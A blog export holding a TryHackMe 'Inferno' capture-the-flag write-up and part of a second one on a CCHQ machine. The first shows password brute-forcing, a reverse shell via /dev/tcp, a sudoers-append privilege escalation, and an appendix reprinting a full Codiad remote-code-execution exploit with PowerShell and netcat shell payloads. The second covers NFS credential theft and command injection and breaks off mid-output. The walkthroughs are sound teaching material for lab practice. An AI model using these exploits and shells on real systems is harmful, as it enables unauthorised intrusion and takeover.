[{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 954 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp? 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA) | 256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA) |_ 256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519) 23/tcp open telnet? 25/tcp open smtp? |_smtp-commands: Couldn't establish connection on port 25 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Dante's Inferno 88/tcp open kerberos-sec? 106/tcp open pop3pw? 110/tcp open pop3? 389/tcp open ldap? 443/tcp open https? 464/tcp open kpasswd5? 636/tcp open ldapssl? 777/tcp open multiling-http? 783/tcp open spamassassin? 808/tcp open ccproxy-http? 873/tcp open rsync? 1001/tcp open webpush? 1236/tcp open bvcontrol? 1300/tcp open h323hostcallsc? 1309/tcp filtered jtag-server 1805/tcp filtered enl-name 1863/tcp filtered msnp 2000/tcp open cisco-sccp? 2003/tcp open finger? |_finger: ERROR: Script execution failed (use -d to debug) 2121/tcp open ccproxy-ftp? 2601/tcp open zebra? 2602/tcp open ripd? 2604/tcp open ospfd? 2605/tcp open bgpd? 2607/tcp open connection? 2608/tcp open wag-service? 4224/tcp open xtell? 5051/tcp open ida-agent? 5432/tcp open postgresql? 5555/tcp open freeciv? 5666/tcp open nrpe? 5998/tcp filtered ncd-diag 6346/tcp open gnutella? 6566/tcp open sane-port? 6667/tcp open irc? |_irc-info: Unable to open connection 8021/tcp open ftp-proxy? 8081/tcp open blackice-icecap? 8088/tcp open radan-http? 9418/tcp open git? 10000/tcp open snet-sensor-mgmt? 10082/tcp open amandaidx? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We see 42 serives running. Going through and testing each one of them is not possible.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.125.29 /index.html (Status: 200) [Size: 638] /inferno (Status: 401) [Size: 459] 1.3. Web Exploration We see some quotes, which may be from the inferno book. We can explore them later if needed.\nWe see the page demanding login and password. Maybe we can try bruteforcing?\nPossible usernames:\n admin dante (the guy who wrote inferno) inferno (the name of the room)  1.4. Bruteforcing ┌──(kali㉿kali)-[~] └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.125.29 http-get /inferno -t 64 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-26 00:13:47 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking http-get://10.10.125.29:80/inferno [STATUS] 6189.00 tries/min, 6189 tries in 00:01h, 14338210 to do in 38:37h, 64 active [80][http-get] host: 10.10.125.29 login: admin password: {password} 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-26 00:16:05 Great! After logging in, we see another login form. Okay \u0026hellip;\n1.5. Codiad Trying out the same creds gets us in. Now I looked for exploits for codiad.\n┌──(kali㉿kali)-[~] └─$ searchsploit codiad -------------------------- --------------------------------- Exploit Title | Path -------------------------- --------------------------------- Codiad 2.4.3 - Multiple V | php/webapps/35585.txt Codiad 2.5.3 - Local File | php/webapps/36371.txt Codiad 2.8.4 - Remote Cod | multiple/webapps/49705.py -------------------------- --------------------------------- Shellcodes: No Results Let\u0026rsquo;s try the RCE one!\nRunning the exploit, we get [-] Login failed! Please check your username and password.\nBut, we know for a fact that it is correct - otherwise we wouldn\u0026rsquo;t be able to login! Whats happening?\nRecall we had to login another form before we saw this. Maybe adding the header of login password, as we saw before would help.\n1.6. Custom Exploit I first inspect the request itself, by intercepting it using burp suite.\nGET /inferno HTTP/1.1 Host: 10.10.125.29 Cache-Control: max-age=0 Authorization: Basic {base64_encoded_authorization} Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Looks like the line Authorization: Basic {base64_encoded_authorization} is the one we are looking for.\nDecoing, we get admin:{password}. Great! Our hypothesis was correct. We just need to add this auth line for all the requests made.\nAdd the line \u0026quot;Authorization\u0026quot;: \u0026quot;Basic {base64_encoded_authorization}\u0026quot; to headers dictionary wherever present, or create a new one wherever not.\nThe code is attached at the very bottom.\n2. Foothold 2.1. Codilad Custom RCE Okay finally! Following the instructions we get a reverse shell.\n┌──(kali㉿kali)-[~/Desktop/tools/files] └─$ python3 codiad.py http://10.10.125.29/inferno/ admin {password} 10.17.8.184 1337 linux [+] Please execute the following command on your vps: echo 'bash -c \u0026quot;bash -i \u0026gt;/dev/tcp/10.17.8.184/1338 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026quot;' | nc -lnvp 1337 nc -lnvp 1338 [+] Please confirm that you have done the two command above [y/n] [Y/n] y [+] Starting... [+] Login Content : {\u0026quot;status\u0026quot;:\u0026quot;success\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;}} [+] Login success! [+] Getting writeable path... [+] Path Content : {\u0026quot;status\u0026quot;:\u0026quot;success\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;inferno\u0026quot;,\u0026quot;path\u0026quot;:\u0026quot;\\/var\\/www\\/html\\/inferno\u0026quot;}} [+] Writeable Path : /var/www/html/inferno [+] Sending payload... {\u0026quot;status\u0026quot;:\u0026quot;error\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;No Results Returned\u0026quot;} [+] Exploit finished! [+] Enjoy your reverse shell! Looks like the connection was immediately closed. Uh. Let\u0026rsquo;s try again?\nWorks! This time as soon as I got in, I spawned a bunch more bash shells. Threw in some /bin/sh ones as well XD\n python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' python3 -c 'import pty; pty.spawn(\u0026quot;/bin/sh\u0026quot;)'  2.2 Exploring Users\ncd /home ls dante SUID\nfind / -type f -perm -u=s 2\u0026gt; /dev/null /bin/su /bin/umount /bin/ping /bin/mount /bin/fusermount /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/pkexec /usr/bin/chfn /usr/bin/passwd /usr/bin/newuidmap /usr/bin/traceroute6.iputils /usr/bin/newgrp /usr/bin/at /usr/bin/chsh /usr/bin/sudo /usr/lib/eject/dmcrypt-get-device /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign crontab\n$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # Kernel status\n$ uname -a uname -a Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Upto date\n2.3. LinPEAS enumeration [+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.21p2 [+] Backup folders drwxr-xr-x 2 root root 4096 Jun 26 03:55 /var/backups total 32 -rw-r--r-- 1 root root 30810 Jan 11 15:22 apt.extended_states.0 drwx------ 2 root root 4096 Jan 11 15:19 /etc/lvm/backup [+] Searching specific hashes inside files - less false positives (limit 70) /etc/apache2/.htpasswd:$apr1$UIfo4gwg$N4DRURQTtq/wytcy8pdGq. Nothing that we don\u0026rsquo;t already know.\n2.4. Manual Exploration $ ls -la /home/dante/Downloads ls -la /home/dante/Downloads total 4420 drwxr-xr-x 2 root root 4096 Jan 11 15:29 . drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 .. -rw-r--r-- 1 root root 1511 Nov 3 2020 .download.dat We see some hex characters. Let\u0026rsquo;s use CyberChef to decode. We get the password for dante user!\ndante:{this_is_in_the_last_line!}\n3. PrivEsc ┌──(kali㉿kali)-[~] └─$ ssh dante@10.10.125.29 The authenticity of host '10.10.125.29 (10.10.125.29)' can't be established. ECDSA key fingerprint is SHA256:QMSVr7PFqk9fLxwYBp9LCg9SjU6kioP9tJbL6ed0mZI. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.125.29' (ECDSA) to the list of known hosts. dante@10.10.125.29's password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Jun 26 05:36:39 UTC 2021 System load: 0.0 Processes: 620 Usage of /: 42.2% of 8.79GB Users logged in: 0 Memory usage: 77% IP address for eth0: 10.10.125.29 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109 dante@Inferno:~$ Yess! Finally SSH after the ***tty shells. This has the same issue btw, so make sure to spam shells (sh looks immune, bash gets killed :thonk:).\n3.1. sudo $ sudo -l Matching Defaults entries for dante on Inferno: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dante may run the following commands on Inferno: (root) NOPASSWD: /usr/bin/tee We have it here on GTFOBins.\nHere\u0026rsquo;s the one liner exploit for sudo tee: echo \u0026quot;dante ALL=(ALL:ALL) ALL\u0026quot; | sudo tee -a /etc/sudoers\nWhat happened here?\nman tee:\n man page of tee: tee - read from standard input and write to standard output and files -a flag appends data we echo the line giving us all the permissions and pipe it to sudo tee with the -a flag to append it in the /etc/sudoers file  Resultant:\n$ sudo -l Matching Defaults entries for dante on Inferno: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dante may run the following commands on Inferno: (root) NOPASSWD: /usr/bin/tee (ALL : ALL) ALL Great!\n$ sudo su root@Inferno:/home/dante# sh # cd /root # ls proof.txt # cat proof.txt Congrats! You've rooted Inferno! {system_compromised} mindsflee And we are done!\nA. Appendix: RCE Codilad Custom Exploit Code # Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) # Discovery by: WangYihang # Vendor Homepage: http://codiad.com/ # Software Links : https://github.com/Codiad/Codiad/releases # Tested Version: Version: 2.8.4 # CVE: CVE-2018-14009 #!/usr/bin/env python # encoding: utf-8 import requests import sys import json import base64 session = requests.Session() def login(domain, username, password): global session url = domain + \u0026quot;/components/user/controller.php?action=authenticate\u0026quot; data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, \u0026quot;theme\u0026quot;: \u0026quot;default\u0026quot;, \u0026quot;language\u0026quot;: \u0026quot;en\u0026quot;, } response = session.post( url, data=data, verify=False, headers={\u0026quot;Authorization\u0026quot;: \u0026quot;Basic {base64_encoded_authorization}\u0026quot;}, ) content = response.text print(\u0026quot;[+] Login Content : %s\u0026quot; % (content)) if 'status\u0026quot;:\u0026quot;success\u0026quot;' in content: return True def get_write_able_path(domain): global session url = domain + \u0026quot;/components/project/controller.php?action=get_current\u0026quot; response = session.get( url, verify=False, headers={\u0026quot;Authorization\u0026quot;: \u0026quot;Basic {base64_encoded_authorization}\u0026quot;} ) content = response.text print(\u0026quot;[+] Path Content : %s\u0026quot; % (content)) json_obj = json.loads(content) if json_obj[\u0026quot;status\u0026quot;] == \u0026quot;success\u0026quot;: return json_obj[\u0026quot;data\u0026quot;][\u0026quot;path\u0026quot;] else: return False def base64_encode_2_bytes(host, port): payload = \u0026quot;\u0026quot;\u0026quot; $client = New-Object System.Net.Sockets.TCPClient(\u0026quot;__HOST__\u0026quot;,__PORT__); $stream = $client.GetStream(); [byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String ); $sendback2 = $sendback + \u0026quot;PS \u0026quot; + (pwd).Path + \u0026quot;\u0026gt; \u0026quot;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); } $client.Close(); \u0026quot;\u0026quot;\u0026quot; result = \u0026quot;\u0026quot; for i in payload.replace(\u0026quot;__HOST__\u0026quot;, host).replace(\u0026quot;__PORT__\u0026quot;, str(port)): result += i + \u0026quot;\\x00\u0026quot; return base64.b64encode(result.encode()).decode().replace(\u0026quot;\\n\u0026quot;, \u0026quot;\u0026quot;) def build_powershell_payload(host, port): preffix = \u0026quot;powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc \u0026quot; return preffix + base64_encode_2_bytes(host, port).replace(\u0026quot;+\u0026quot;, \u0026quot;%2b\u0026quot;) def exploit(domain, username, password, host, port, path, platform): global session url = ( domain + \u0026quot;components/filemanager/controller.php?type=1\u0026amp;action=search\u0026amp;path=%s\u0026quot; % (path) ) if platform.lower().startswith(\u0026quot;win\u0026quot;): # new version escapeshellarg # escapeshellarg on windows will quote the arg with \u0026quot;\u0026quot; # so we need to try twice payload = \u0026quot;||%s||\u0026quot; % (build_powershell_payload(host, port)) payload = \u0026quot;search_string=Hacker\u0026amp;search_file_type=\u0026quot; + payload headers = { \u0026quot;Content-Type\u0026quot;: \u0026quot;application/x-www-form-urlencoded; charset=UTF-8\u0026quot;, \u0026quot;Authorization\u0026quot;: \u0026quot;Basic {base64_encoded_authorization}\u0026quot;, } response = session.post(url, data=payload, headers=headers, verify=False) content = response.text print(content) # old version escapeshellarg payload = \u0026quot;%%22||%s||\u0026quot; % (build_powershell_payload(host, port)) payload = \u0026quot;search_string=Hacker\u0026amp;search_file_type=\u0026quot; + payload headers = { \u0026quot;Content-Type\u0026quot;: \u0026quot;application/x-www-form-urlencoded; charset=UTF-8\u0026quot;, \u0026quot;Authorization\u0026quot;: \u0026quot;Basic {base64_encoded_authorization}\u0026quot;, } response = session.post(url, data=payload, headers=headers, verify=False) content = response.text print(content) else: # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ''' payload = '\u0026quot;%%0Anc %s %d|/bin/bash %%23' % (host, port) payload = \u0026quot;search_string=Hacker\u0026amp;search_file_type=\u0026quot; + payload headers = { \u0026quot;Content-Type\u0026quot;: \u0026quot;application/x-www-form-urlencoded; charset=UTF-8\u0026quot;, \u0026quot;Authorization\u0026quot;: \u0026quot;Basic {base64_encoded_authorization}\u0026quot;, } response = session.post(url, data=payload, headers=headers, verify=False) content = response.text print(content) def promote_yes(hint): print(hint) while True: ans = input(\u0026quot;[Y/n] \u0026quot;).lower() if ans == \u0026quot;n\u0026quot;: return False elif ans == \u0026quot;y\u0026quot;: return True else: print(\u0026quot;Incorrect input\u0026quot;) def main(): if len(sys.argv) != 7: print(\u0026quot;Usage : \u0026quot;) print( \u0026quot; python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]\u0026quot; % (sys.argv[0]) ) print( \u0026quot; python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]\u0026quot; % (sys.argv[0]) ) print(\u0026quot;Example : \u0026quot;) print( \u0026quot; python %s http://localhost/ admin admin 8.8.8.8 8888 linux\u0026quot; % (sys.argv[0]) ) print( \u0026quot; python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows\u0026quot; % (sys.argv[0]) ) print(\u0026quot;Author : \u0026quot;) print(\u0026quot; WangYihang \u0026lt;wangyihanger@gmail.com\u0026gt;\u0026quot;) exit(1) domain = sys.argv[1] username = sys.argv[2] password = sys.argv[3] host = sys.argv[4] port = int(sys.argv[5]) platform = sys.argv[6] if platform.lower().startswith(\u0026quot;win\u0026quot;): print(\u0026quot;[+] Please execute the following command on your vps: \u0026quot;) print(\u0026quot;nc -lnvp %d\u0026quot; % (port)) if not promote_yes( \u0026quot;[+] Please confirm that you have done the two command above [y/n]\u0026quot; ): exit(1) else: print(\u0026quot;[+] Please execute the following command on your vps: \u0026quot;) print( \u0026quot;echo 'bash -c \\\u0026quot;bash -i \u0026gt;/dev/tcp/%s/%d 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\\\u0026quot;' | nc -lnvp %d\u0026quot; % (host, port + 1, port) ) print(\u0026quot;nc -lnvp %d\u0026quot; % (port + 1)) if not promote_yes( \u0026quot;[+] Please confirm that you have done the two command above [y/n]\u0026quot; ): exit(1) print(\u0026quot;[+] Starting...\u0026quot;) if not login(domain, username, password): print(\u0026quot;[-] Login failed! Please check your username and password.\u0026quot;) exit(2) print(\u0026quot;[+] Login success!\u0026quot;) print(\u0026quot;[+] Getting writeable path...\u0026quot;) path = get_write_able_path(domain) if path == False: print(\u0026quot;[+] Get current path error!\u0026quot;) exit(3) print(\u0026quot;[+] Writeable Path : %s\u0026quot; % (path)) print(\u0026quot;[+] Sending payload...\u0026quot;) exploit(domain, username, password, host, port, path, platform) print(\u0026quot;[+] Exploit finished!\u0026quot;) print(\u0026quot;[+] Enjoy your reverse shell!\u0026quot;) if __name__ == \u0026quot;__main__\u0026quot;: main() ","date":"2021-06-26T00:00:00Z","image":"https://i.imgur.com/4t9185h.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/","title":"TryHackMe: Inferno Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA) | 256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA) |_ 256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 34481/tcp6 mountd | 100005 1,2,3 37413/udp6 mountd | 100005 1,2,3 43347/udp mountd | 100005 1,2,3 56545/tcp mountd | 100021 1,3,4 34901/tcp6 nlockmgr | 100021 1,3,4 46744/udp nlockmgr | 100021 1,3,4 46749/tcp nlockmgr | 100021 1,3,4 60804/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) 8080/tcp open http Werkzeug httpd 0.14.1 (Python 3.6.9) | http-methods: |_ Supported Methods: OPTIONS GET HEAD |_http-server-header: Werkzeug/0.14.1 Python/3.6.9 |_http-title: CCHQ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Info gathered:\n SSH on 22 open HTTP on 8080 open NFS on 2049 open  1.2. Web Enumeration Doing a basic enumeration, we get the pages: /cat and /login.\n1.3. Web Exploration The home page: The login page: I tried some basic SQLI attacks, but they did not work. Recall that we had the 2049 port open with NFS running. Let\u0026rsquo;s explore that first then.\n1.4. NFS Let\u0026rsquo;s see what all do we have:\n┌──(kali㉿kali)-[~] └─$ showmount --exports 10.10.80.121 Export list for 10.10.80.121: /var/nfs/general * Amazing! Looks like we can get something. Follow the steps to mount shares using NFS service:\n Go to /tmp on your machine. (Or wherever you want. I prefer /tmp.) Make a directory where the files of the other system would be mounted. Call it whatever you want. Mount the shares using sudo mount --type nfs. Make sure to sudo!  ┌──(kali㉿kali)-[~] └─$ /tmp ┌──(kali㉿kali)-[/tmp] └─$ mkdir general ┌──(kali㉿kali)-[/tmp] └─$ sudo mount --type nfs 10.10.80.121:/var/nfs/general general [sudo] password for kali: And we have successfully mounted the files shared using NFS. Let\u0026rsquo;s explore them.\n┌──(kali㉿kali)-[/tmp] └─$ cd general ┌──(kali㉿kali)-[/tmp/general] └─$ ls credentials.bak ┌──(kali㉿kali)-[/tmp/general] └─$ cat credentials.bak {username} {password was here *nom* *nom* sorry what?} And we get the credentials for the login!\n2. Foothold 2.1. Getting RCE We finally get in. We see a page where we can put payload. It took me a lot of experimentation and time to get RCE. Here\u0026rsquo;s what I figured.\n Whatever you put in the payload gets echo-ed exactly as is, on the resultant page. There may be php or python3 or whatever program running. What if the input is not sanitised? How about using \u0026ldquo;;\u0026rdquo;? Trying out wow\u0026quot;; echo \u0026ldquo;bruh\u0026rdquo; - does not work. Checking for more, I get this page: OWASP Command Injection, how about \u0026ldquo;|\u0026rdquo; in the list?  I use reverse shells from Reverse Shell Generator.\nBONUS:\n I tried other revshells: bash and the mkfifo one. Did not work. I tried using \u0026amp; and \u0026amp;\u0026amp;. Also did not work.  2.2. Exploring I like to check a couple of things when I first get in any machine:\n What all users exist? All files having SUID bits set crontab Kernel version  Users $ cd /home cd /home $ ls ls paradox szymex tux varg SUID bits $ bash -i bash -i paradox@cchq:/home$ find / -type f -perm -u=s 2\u0026gt; /dev/null find / -type f -perm -u=s 2\u0026gt; /dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/newgrp /usr/bin/at /usr/bin/pkexec /usr/bin/gpasswd /usr/bin/traceroute6.iputils /usr/bin/passwd /usr/bin/chfn /usr/bin/sudo /usr/bin/chsh /home/varg/CooctOS.py /bin/ping /bin/mount /bin/su /bin/umount /bin/fusermount /sbin/mount.nfs One of them pops out!\nparadox@cchq:/home$ ls -la /home/varg/CooctOS.py ls -la /home/varg/CooctOS.py -rwsrws--x 1 varg varg 2146 Feb 20 22:05 /home/varg/CooctOS.py Kernel Version paradox@cchq:~$ uname -a uname -a Linux cchq 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Upto date.\ncrontab paradox@cchq:~$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * szymex /home/szymex/SniffingCat.py # Last line looks very interesting.\n2.3. Info Gathered  /home/szymex/SniffingCat.py is running every minute, by the user szymex /home/varg/CooctOS.py has SUID set Okay. We are ready for PrivEscs.  3. PrivEsc 3.1. szymex Exploring inside szy, we get a file called note_to_para and SniffingCat.py.\nparadox@cchq:/home/szymex$ cat note_to_para cat note_to_para Paradox, I'm testing my new Dr. Pepper Tracker script. It detects the location of shipments in real time and sends the coordinates to your account. If you find this annoying you need to change my super secret password file to disable the tracker. You know me, so you know how to get access to the file. - Szymex Looks like szy has some password there. Let\u0026rsquo;s open it up.\nparadox@cchq:/home/szymex$ cat SniffingCat.py cat SniffingCat.py #!/usr/bin/python3 import os import random def encode(pwd): enc = '' for i in pwd: if ord(i) \u0026gt; 110: num = (13 - (122 - ord(i))) + 96 enc += chr(num) else: enc += chr(ord(i) + 13) return enc x = random.randint(300,700) y = random.randint(0,255) z = random.randint(0,1000) message = \u0026quot;Approximate location of an upcoming Dr.Pepper shipment found:\u0026quot; coords = \u0026quot;Coordinates: X: {x}, Y: {y}, Z: {z}\u0026quot;.format(x=x, y=y, z=z) with open('/home/szymex/mysupersecretpassword.cat', 'r') as f: line = f.readline().rstrip(\u0026quot;\\n\u0026quot;) enc_pw = encode(line) if enc_pw == \u0026quot;{encoded_password_was_here_mmm}\u0026quot;: os.system(\u0026quot;wall -g paradox \u0026quot; + message) os.system(\u0026quot;wall -g paradox \u0026quot; + coords) What\u0026rsquo;s happening here?\n Every minute (for eternity) the above script is run The script opens a mysupersecretpassword.cat file and checks if the thing put in can be encoded to be same. We need to find the string that encodes as the above. Python3 scripting time!  Here\u0026rsquo;s what I came up with:\nimport string def encode(pwd): enc = \u0026quot;\u0026quot; for i in pwd: if ord(i) \u0026gt; 110: num = (13 - (122 - ord(i))) + 96 enc += chr(num) else: enc += chr(ord(i) + 13) return enc ans = \u0026quot;\u0026quot; for c in \u0026quot;{yee_haww}\u0026quot;: save = None for x in string.printable: save = x if encode(x) == c: break ans += save print(ans) After cracking this, maybe we can try directly sudo-ing into szymex?\nparadox@cchq:~$ su szymex su szymex Password: szymex@cchq:/home/paradox$ cd ~ cd ~ szymex@cchq:~$ Works!\n3.2. tux I was stuck here for a bit, before I tried id.\nszymex@cchq:~$ id id uid=1001(szymex) gid=1001(szymex) groups=1001(szymex),1004(testers) testers looks intersting. Let\u0026rsquo;s see what all do we have.\nszymex@cchq:/home/varg$ find / -type f -group testers 2\u0026gt; /dev/null find / -type f -group testers 2\u0026gt; /dev/null /home/tux/tuxling_3/note /home/tux/tuxling_1/nootcode.c /home/tux/tuxling_1/note /media/tuxling_2/private.key /media/tuxling_2/note /media/tuxling_2/fragment.asc Woah. That\u0026rsquo;s a lotta files. Going through them,\nNote 3:\nHi! Kowalski here. I was practicing my act of disappearance so good job finding me. Here take this, The last fragment is: {wow3} Combine them all and visit the station. Note 1:\n#include \u0026lt;stdio.h\u0026gt; #define noot int #define Noot main #define nOot return #define noOt ( #define nooT ) #define NOOOT \u0026quot;{hidden}\u0026quot; #define NooT ; #define Nooot nuut #define NOot { #define nooot key #define NoOt } #define NOOt void #define NOOT \u0026quot;NOOT!\\n\u0026quot; #define nooOT \u0026quot;{hidden}\u0026quot; #define noOT printf #define nOOT 0 #define nOoOoT \u0026quot;What does the penguin say?\\n\u0026quot; #define nout \u0026quot;{hidden}\u0026quot; noot Noot noOt nooT NOot noOT noOt nOoOoT nooT NooT Nooot noOt nooT NooT nOot nOOT NooT NoOt NOOt nooot noOt nooT NOot noOT noOt NOOOT nooOT nout nooT NooT NoOt NOOt Nooot noOt nooT NOot noOT noOt NOOT nooT NooT NoOt Its C code, with a lot of #s. Compiling, we get:\n┌──(kali㉿kali)-[/tmp] └─$ ./a.out What does the penguin say? NOOT! Not helpful. Although, looking at the source more closely, we can see some hex strings. They are in the line which I have translated below.\n... printf *** **** *** ; ...\nWe get the first string!\nNote 2:\nszymex@cchq:/home/varg$ cat /media/tuxling_2/note cat /media/tuxling_2/note Noot noot! You found me. I'm Rico and this is my challenge for you. General Tux handed me a fragment of his secret key for safekeeping. I've encrypted it with Penguin Grade Protection (PGP). You can have the key fragment if you can decrypt it. Good luck and keep on nooting! Looks like we are looking at a pgp key.\nszymex@cchq:~$ file /media/tuxling_2/fragment.asc file /media/tuxling_2/fragment.asc /media/tuxling_2/fragment.asc: PGP message Public-Key Encrypted Session Key (old) I initially tried breaking it, but then I saw the /media/tuxling_2/private.key file. Import the key and we are done!\nszymex@cchq:~$ file /media/tuxling_2/fragment.asc file /media/tuxling_2/fragment.asc /media/tuxling_2/fragment.asc: PGP message Public-Key Encrypted Session Key (old) szymex@cchq:~$ gpg --import /media/tuxling_2/private.key gpg --import /media/tuxling_2/private.key gpg: key B70EB31F8EF3187C: public key \u0026quot;TuxPingu\u0026quot; imported gpg: key B70EB31F8EF3187C: secret key imported gpg: Total number processed: 1 gpg: imported: 1 gpg: secret keys read: 1 gpg: secret keys 